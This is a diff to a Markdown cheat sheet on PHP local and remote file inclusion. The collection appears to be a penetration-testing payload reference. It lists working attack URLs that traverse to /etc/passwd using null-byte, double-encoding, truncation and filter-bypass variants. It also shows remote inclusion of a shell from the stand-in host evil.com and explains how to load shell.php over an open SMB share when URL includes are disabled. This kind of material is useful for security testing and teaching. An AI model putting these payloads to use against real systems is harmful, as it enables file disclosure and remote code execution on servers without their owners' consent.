@@ -1,12 +1,16 @@
 # File Inclusion
 
-The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.
+> The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.
 
-The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application
+> The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application
 
 ## Summary
 
 * [Basic LFI](#basic-lfi)
+    * [Null byte](#null-byte)
+    * [Double encoding](#double-encoding)
+    * [Path and dot truncation](#path-and-dot-truncation)
+    * [Filter bypass tricks](#filter-bypass-tricks)
 * [Basic RFI](#basic-rfi)
 * [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
   * [Wrapper php://filter](#wrapper-phpfilter)
@@ -31,27 +35,31 @@ In the following examples we include the `/etc/passwd` file, check the `Director
 http://example.com/index.php?page=../../../etc/passwd
 ```
 
-Null byte
+### Null byte
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd%00
 ```
 
-Double encoding
+### Double encoding
 
 ```powershell
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
 
-Path truncation
+### Path and dot truncation
+
+On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.
 
 ```powershell
-http://example.com/index.php?page=../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
-http://example.com/index.php?page=../../../../[…]../../../../../etc/passwd
+http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
+http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
+http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
+http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
 ```
 
-Filter bypass tricks
+### Filter bypass tricks
 
 ```powershell
 http://example.com/index.php?page=....//....//etc/passwd
@@ -61,21 +69,32 @@ http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C
 
 ## Basic RFI
 
+Most of the filter bypasses from LFI section can be reused for RFI.
+
 ```powershell
 http://example.com/index.php?page=http://evil.com/shell.txt
 ```
 
-Null byte
+### Null byte
 
 ```powershell
 http://example.com/index.php?page=http://evil.com/shell.txt%00
 ```
 
-Double encoding
+### Double encoding
 
 ```powershell
 http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 ```
+
+### Bypass allow_url_include
+
+When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.
+
+1. Create a share open to everyone
+2. Write a PHP code inside a file : `shell.php`
+3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
+
 
 ## LFI / RFI using wrappers
 
@@ -285,3 +304,5 @@ login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/s
 * [New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
 * [It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
 * [Local file inclusion mini list - Penetrate.io](https://penetrate.io/2014/09/25/local-file-inclusion-mini-list/)
+* [CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
+* [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html?m=1)
